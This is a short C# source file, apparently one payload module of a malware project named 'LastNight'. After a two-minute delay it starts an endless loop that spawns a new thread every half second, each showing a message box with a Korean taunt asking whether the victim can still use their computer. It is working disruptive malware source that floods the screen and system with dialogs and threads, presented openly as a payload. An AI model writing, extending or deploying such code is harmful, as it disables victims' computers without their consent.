using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace LastNight.Payloads
{
    public class MassMessageBox
    {
        public void RunPayload()
        {
            Thread thr = new Thread(new ThreadStart(() =>
            {
                Thread.Sleep(120000); // 120sec
                while (true)
                {
                    Thread thr2 = new Thread(new ThreadStart(() =>
                    {
                        MessageBox.Show("아직도 컴퓨터를 사용할 수 있냐? 포기하든가 ㅋ");
                    }));
                    thr2.Start();
                    Thread.Sleep(500);
                }
            }));
            thr.Start();
        }
    }
}
